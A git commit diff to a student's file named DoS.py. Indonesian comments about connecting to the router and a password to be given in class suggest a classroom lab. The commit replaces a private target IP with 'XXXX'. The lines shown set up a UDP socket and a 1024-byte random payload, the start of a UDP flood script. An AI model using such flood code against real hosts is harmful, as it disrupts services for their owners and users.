b14050bb0788ae3b0e5681a9148e38dfd5cb35d8
MadeIvan <220712063@students.uajy.ac.id>
2024-12-01 17:03:36 +0700

    Update DoS.py

--- DoS.py
+++ DoS.py
@@ -1,8 +1,8 @@
 import socket
 import random
 
-target_ip = "10.113.204.149" #pastiin udh terkoneksi sm router nya dlu yaa 
-target_port = 80             #untuk passwordnya bakal dikasi tau dikelas
+target_ip = "XXXX" #sementara disamarin dlu  #pastiin udh terkoneksi sm router nya dlu yaa 
+target_port = 80                             #untuk passwordnya bakal dikasi tau dikelas
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
